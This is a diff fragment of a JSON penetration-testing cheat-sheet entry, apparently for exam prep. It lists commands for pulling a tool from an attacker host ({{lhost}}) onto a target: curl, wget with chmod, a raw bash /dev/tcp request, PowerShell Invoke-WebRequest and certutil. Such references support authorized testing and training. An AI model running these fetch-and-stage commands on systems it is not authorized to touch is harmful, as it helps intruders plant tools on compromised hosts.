+      "how": "Start the HTTP server on Kali, then run the matching client line on the target. certutil and PowerShell are the Windows LOLBIN fallbacks; curl/wget/bash /dev/tcp cover Linux.",
+      "code": "# Serve the file from your box (current directory):\npython3 -m http.server 80\n# Linux target - curl or wget:\ncurl -s http://{{lhost}}/tool -o /tmp/tool && chmod +x /tmp/tool\nwget -q http://{{lhost}}/tool -O /tmp/tool\n# Linux with neither installed - raw bash /dev/tcp:\nexec 3<>/dev/tcp/{{lhost}}/80; printf 'GET /tool HTTP/1.0\\r\\n\\r\\n' >&3; cat <&3 > /tmp/tool\n# Windows target - PowerShell or a signed LOLBIN:\npowershell -c \"Invoke-WebRequest http://{{lhost}}/tool.exe -OutFile C:\\Users\\Public\\t.exe\"\ncertutil -urlcache -split -f http://{{lhost}}/tool.exe C:\\Users\\Public\\t.exe",
+      "execMode": "target",
+      "examSafe": true,
+      "substitutesFor": [],
+      "examSafeReason": "Relies only on binaries already present on the host (living off the land); no transfer tooling is uploaded."
+    }
+  ]
+}
